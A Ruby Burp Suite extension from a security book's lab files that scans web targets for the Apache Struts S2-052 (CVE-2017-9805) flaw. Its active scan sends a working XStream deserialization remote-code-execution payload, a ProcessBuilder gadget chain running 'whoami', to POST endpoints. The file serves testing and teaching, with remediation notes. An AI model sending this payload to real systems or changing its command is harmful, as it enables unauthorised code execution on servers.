#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Burp extension to actively and passively scan Struts-S2-052 (CVE-2017-9805)
# Requirements:
#   jruby | jruby-code-xxx-complete.jar
#   Burp Suite
#
require 'java'

java_import 'burp.IBurpExtender'
java_import 'burp.IScannerCheck'
java_import 'burp.IScanIssue'
java_import 'burp.IRequestInfo'

class BurpExtender
  include IBurpExtender, IScannerCheck, IScanIssue

  def registerExtenderCallbacks(callbacks)
    @callbacks = callbacks
    @helpers = callbacks.getHelpers
    @callbacks.setExtensionName("Struts2 Scanner")
    @callbacks.registerScannerCheck(self)

  rescue Exception => e
    pp e.full_message
  end

  # doPassiveScan is a method for IScannerCheck interface which burp is going
  # to look for when IScannerCheck is included
  # https://portswigger.net/burp/extender/api/burp/IScannerCheck.html#doPassiveScan(burp.IHttpRequestResponse)
  #
  # Here we want to build a passive scan than does the following:
  #   - Check each response comes to the proxy -or repeater, intruder (need to be configured)-
  #   - Create an issue if a the response body contains a specific string.
  #   - The issue should contains the following:
  #     - the issue name plus 'Passive Scan' to let us know it's from the passive scan
  #     - the issue confidence to be 'Firm' if target is vulnerable
  #
  # @param [IHttpRequestResponse] base_req_res
  #   Burp is going to pass IHttpRequestResponse object to #doPassiveScan method by default
  #
  # @return [Array<IScanIssue>] of issues
  def doPassiveScan(base_req_res)
    issues = []
    # report the issue
    if base_req_res.getResponse && Strust2.vulnerable?(base_req_res, @helpers)
      strust2 = Strust2.new(base_req_res, @helpers)
      strust2.name       = 'Passive Scan'
      strust2.confidence = 'Firm'
      issues.push(strust2.to_java(IScanIssue))
    end

    return issues
  rescue Exception => e
    pp e.full_message
  end

  # doActiveScan is a method for IScannerCheck interface which burp is going
  # to look for when IScannerCheck is included
  # https://portswigger.net/burp/extender/api/burp/IScannerCheck.html#doActiveScan(burp.IHttpRequestResponse,%20burp.IScannerInsertionPoint)
  #
  # Here we want to build an active scan than does the following:
  #   - Create a POST request
  #   - Inject our payload in every insertionpoint for each request
  #   - Create an issue if a the response body contains a specific string.
  #   - The issue should contains the following:
  #     - the issue name plus 'Active Scan' to let us know it's from the passive scan
  #     - the issue confidence to be 'Certain' if target is vulnerable
  #
  # @param [IHttpRequestResponse] base_req_res
  #   Burp is going to pass IHttpRequestResponse object to #doActiveScan method by default
  # @param [IScannerInsertionPoint] insertion_point
  #   Burp is going to pass IScannerInsertionPoint object to #doActiveScan method by default
  #
  # @return [Array<IScanIssue>] of issues
  def doActiveScan(base_req_res, insertion_point)
    issues       = []
    analyzed_req = @helpers.analyzeRequest(base_req_res)

    if analyzed_req.getMethod == 'POST'
      headers      = analyzed_req.getHeaders.to_a
      cti          = headers.find_index {|h| h.include?('Content-Type')}
      headers[cti] = 'Content-type: application/xml'

      evil_payload  = Strust2.payload.bytes
      evil_http_msg = @helpers.buildHttpMessage(headers, evil_payload)
      evil_req_res  = @callbacks.makeHttpRequest(base_req_res.getHttpService, evil_http_msg)

      return nil unless Strust2.vulnerable?(evil_req_res, @helpers)

      # get the offsets of the payload within the request, for in-UI highlighting
      # req_markers = [insertion_point.getPayloadOffsets(Strust2.payload.bytes)]
      # res_markers = find_matches(evil_req_res.getResponse, Strust2.payload.bytes)
      strust2 = Strust2.new(evil_req_res, @helpers)
      strust2.name       = 'Active Scan'
      strust2.confidence = 'Certain'
      issues.push(strust2.to_java(IScanIssue))
    end

    return issues
  rescue Exception => e
    pp e.full_message
  end

  # handels the issue dubplication.
  #   It adds the issue if not exists or romove it othwerwise.
  #
  # @param [IScanIssue] existingIssue
  # @param [IScanIssue] newIssue
  #
  # @return [Integer]
  def consolidateDuplicateIssues(existingIssue, newIssue)
    existingIssue.getIssueName == newIssue.getIssueName ? -1 : 0
  end

  # find_matches finds all matches in a response bytes.
  # @param [Array<Integer>] response
  #   an array of bytes which represent the reponse string
  # @param [Array<Integer>] match
  #   an array of bytes which represent the string we are looking for in the response's bytes
  #
  # @return [Array] of matches
  def find_matches(response, match)
    matches = []
    offset  = 0

    while offset < response.length
      offset = @helpers.indexOf(response, match, true, offset, response.length)
      return if offset.negative? # -1 means no match
      matches.push([offset, offset + match.length].to_java(:int))
      offset += match.length
    end

    return matches
  end
end


#
# The issue(vulnerability) class which contains all related information and core functionality.
# The explicitely named methods are required by [IScanIssue] interface when
#  creating/reporting an issue to the vulnerable target dashboard.
# https://portswigger.net/burp/extender/api/burp/IScanIssue.html
#
class Strust2

  def self.payload
    <<~PAY
    <map>
      <entry>
          <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                      <is class="javax.crypto.CipherInputStream">
                        <cipher class="javax.crypto.NullCipher">
                            <initialized>false</initialized>
                            <opmode>0</opmode>
                            <serviceIterator class="javax.imageio.spi.FilterIterator">
                              <iter class="javax.imageio.spi.FilterIterator">
                                  <iter class="java.util.Collections$EmptyIterator" />
                                  <next class="java.lang.ProcessBuilder">
                                    <command>
                                      <string>whoami</string>
                                    </command>
                                    <redirectErrorStream>false</redirectErrorStream>
                                  </next>
                              </iter>
                              <filter class="javax.imageio.ImageIO$ContainsFilter">
                                  <method>
                                    <class>java.lang.ProcessBuilder</class>
                                    <name>start</name>
                                    <parameter-types />
                                  </method>
                                  <name>BHR</name>
                              </filter>
                              <next class="string">BHR</next>
                            </serviceIterator>
                            <lock />
                        </cipher>
                        <input class="java.lang.ProcessBuilder$NullInputStream" />
                        <ibuffer />
                        <done>false</done>
                        <ostart>0</ostart>
                        <ofinish>0</ofinish>
                        <closed>false</closed>
                      </is>
                      <consumed>false</consumed>
                  </dataSource>
                  <transferFlavors />
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
          </jdk.nashorn.internal.objects.NativeString>
          <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString" />
      </entry>
      <entry>
          <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString" />
          <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString" />
      </entry>
    </map>
    PAY

  end

  def self.vulnerable?(base_req_res, helpers)
    response = base_req_res.getResponse
    success  = 'java.lang.String cannot be cast to java.security.Provider$Service'.bytes.freeze
    search   = helpers.indexOf(response, success, true, 0, response.length)
    search.positive? ? true : false
  rescue Exception => e
    pp e.full_message
  end

  attr_accessor :name, :url, :type, :severity, :confidence,
                :background, :remediation_background, :detail,
                :remediation_detail, :http_messages, :http_service

  def initialize(base_req_res, helpers)
    @base_req_res = base_req_res
    @helpers      = helpers
  end

  def getUrl
    @url = @helpers.analyzeRequest(@base_req_res).getUrl
  rescue Exception => e
    pp e.full_message
  end

  def getIssueName
    @name = 'BHR | Struts-S2-052 (CVE-2017-9805)' + " | #{@name.to_s}"
  end

  def getIssueType
    @type = 0x00101101
  end

  # "High", "Medium", "Low", "Information" or "False positive"
  def getSeverity
    @severity = @severity || 'High'
  end

  # "Certain", "Firm" or "Tentative"
  def getConfidence
    @confidence = @confidence || "Tentative"
  end

  def getIssueDetail
    @detail = "The response contains the string: 'java.lang.String cannot be cast to java.security.Provider$Service'"
  end

  def getIssueBackground
    @issue_background = <<~EOF
        The REST Plugin is using a XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.
        It is possible that some REST actions stop working because of applied default restrictions on available classes. In such case please investigate the new interfaces that was introduced to allow define class restrictions per action, those interfaces are:
          <ul>
            <li>org.apache.struts2.rest.handler.AllowedClasses</li>
            <li>org.apache.struts2.rest.handler.AllowedClassNames</li>
            <li>org.apache.struts2.rest.handler.XStreamPermissionProvider</li>
          </ul>
      EOF
  end

  # def getRemediationDetail
  #   @remediation_detail = <<~EOF
  #     Upgrade to Apache Struts version 2.5.13 or 2.3.34.
  #   EOF
  # end

  def getRemediationBackground
    @remediation_background = <<~EOF
      Upgrade to Apache Struts version 2.5.13 or 2.3.34.<br>
      <b>References</b><br>
      <ul>
        <li>https://cwiki.apache.org/confluence/display/WW/S2-052</li>
      </ul>
      <b>Vulnerability classifications</b><br>
      <ul>
        <li>CWE-502: Deserialization of Untrusted Data</li>
      </ul>
    EOF
  end

  def getHttpMessages
    @http_messages = @base_req_res.is_a?(Array) ? @base_req_res : [@base_req_res]
  rescue Exception => e
    pp e.full_message
  end

  def getHttpService
    @http_service = @base_req_res.getHttpService
  rescue Exception => e
    pp e.full_message
  end
end
